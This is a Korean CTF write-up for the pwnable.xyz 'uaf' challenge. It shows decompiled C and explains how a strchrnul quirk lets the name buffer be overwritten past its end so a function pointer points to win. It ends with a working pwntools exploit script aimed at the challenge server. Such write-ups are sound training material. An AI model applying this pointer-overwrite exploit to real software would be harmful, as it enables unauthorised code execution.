---
title: "[pwnable.xyz]uaf"
date: 2020-2-7
tags: [pwnable.xyz]
categories: [pwnable.xyz]
---

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char *v3; // rsi
  const char *v4; // rdi
  __int64 savedregs; // [rsp+10h] [rbp+0h]

  setup();
  initialize_game();
  printf("Name: ", argv);
  v3 = cur;
  v4 = 0LL;
  read(0, cur, 127uLL);
  while ( 1 )
  {
    print_menu();
    read_int32();
    switch ( &savedregs )
    {
      case 0u:
        return 0;
      case 1u:
        (*(cur + 17))(v4, v3);
        break;
      case 2u:
        save_game();
        break;
      case 3u:
        delete_save();
        break;
      case 4u:
        v3 = cur;
        v4 = "Save name: %s\n";
        printf("Save name: %s\n", cur);
        break;
      case 5u:
        edit_char();
        break;
      default:
        v4 = "Invalid";
        puts("Invalid");
        break;
    }
  }
}
```

uaf를 이용해서 푸려고 했는데 `_do_global_ctors_aux` 함수에서 __free_hook에 핸들러 주소를 넣어서 uaf를 할 수 없다.

```c
unsigned __int64 _do_global_ctors_aux()
{
  __int64 v1; // [rsp+8h] [rbp-38h]
  void *handle; // [rsp+10h] [rbp-30h]
  char needle; // [rsp+21h] [rbp-1Fh]
  char v4; // [rsp+22h] [rbp-1Eh]
  char v5; // [rsp+23h] [rbp-1Dh]
  char v6; // [rsp+24h] [rbp-1Ch]
  char v7; // [rsp+25h] [rbp-1Bh]
  char s; // [rsp+26h] [rbp-1Ah]
  char v9; // [rsp+27h] [rbp-19h]
  char v10; // [rsp+28h] [rbp-18h]
  char v11; // [rsp+29h] [rbp-17h]
  char v12; // [rsp+2Ah] [rbp-16h]
  char v13; // [rsp+2Bh] [rbp-15h]
  char name; // [rsp+2Ch] [rbp-14h]
  char v15; // [rsp+2Dh] [rbp-13h]
  char v16; // [rsp+2Eh] [rbp-12h]
  char v17; // [rsp+2Fh] [rbp-11h]
  char v18; // [rsp+30h] [rbp-10h]
  char v19; // [rsp+31h] [rbp-Fh]
  char v20; // [rsp+32h] [rbp-Eh]
  char v21; // [rsp+33h] [rbp-Dh]
  char v22; // [rsp+34h] [rbp-Ch]
  char v23; // [rsp+35h] [rbp-Bh]
  char v24; // [rsp+36h] [rbp-Ah]
  char v25; // [rsp+37h] [rbp-9h]
  unsigned __int64 v26; // [rsp+38h] [rbp-8h]

  v26 = __readfsqword(0x28u);
  s = 'e';
  v9 = 'r';
  v10 = 'r';
  v11 = 'o';
  v12 = 'r';
  v13 = '\0';
  v1 = qword_602008;
  needle = 'l';
  v4 = 'i';
  v5 = 'b';
  v6 = 'c';
  v7 = 0;
  while ( !strstr(*(v1 + 8), &needle) )
    v1 = *(v1 + 24);
  handle = dlopen(*(v1 + 8), 1);
  if ( !handle )
  {
    puts(&s);
    exit(1);
  }
  name = 95;
  v15 = '_';
  v16 = 'f';
  v17 = 'r';
  v18 = 'e';
  v19 = 'e';
  v20 = '_';
  v21 = 'h';
  v22 = 'o';
  v23 = 'o';
  v24 = 'k';
  v25 = '\0';
  *dlsym(handle, &name) = handler;
  dlclose(handle);
  return __readfsqword(0x28u) ^ v26;
}
```



*cur에서 값을 찾아서 replace해줄 수 있다.

```c
int edit_char()
{
  int result; // eax
  unsigned __int8 v1; // [rsp+6h] [rbp-Ah]
  char v2; // [rsp+7h] [rbp-9h]

  puts("Edit a character from your name.");
  printf("Char to replace: ");
  v1 = getchar();
  getchar();
  printf("New char: ");
  v2 = getchar();
  result = getchar();
  if ( v1 && v2 )
  {
    result = strchrnul(cur, v1);
    if ( result )
      *result = v2;
    else
      result = puts("Character not found.");
  }
  return result;
}
```

strchrnul함수에서 원하는 값이 없으면 널바이트 주소를 리턴해서 v2 값을 넣을 수 있다. 그래서 쭉 덮다가 뒤에 calc 함수 포인터를 win주소로 replace해주면 된다.

> exploit.py

```python
from pwn import *

context.log_level = 'debug'
e = ELF('./challenge')
# p = process('./challenge')
p = remote('svc.pwnable.xyz',30015)
sa = lambda x,y : p.sendafter(x,y)
sla = lambda x,y : p.sendlineafter(x,y)

cur = 0x00000000006022C0 # (32)
saves = 0x00000000006022E0
win = 0x0000000000400cf3

def quit():
	sa('>','0')

def play():
	sa('>','1')

def save_game(name):
	sa('>','2')
	sa(':',name)

def delete_save(idx):
	sa('>','3')
	sa(':',str(idx))

def print_name():
	sa('>','4')

def change_char(a,b):
	sa('>','5')
	sla(':',a)
	sla(':',b)

sa(':','A'*127) # Name:
change_char('B','B')
change_char('C','C')
change_char('D','D')
change_char('E','E')
change_char('F','F')
change_char('\x0d','\x0c')
change_char('\x6b','\xf3')

play()

p.interactive()
```

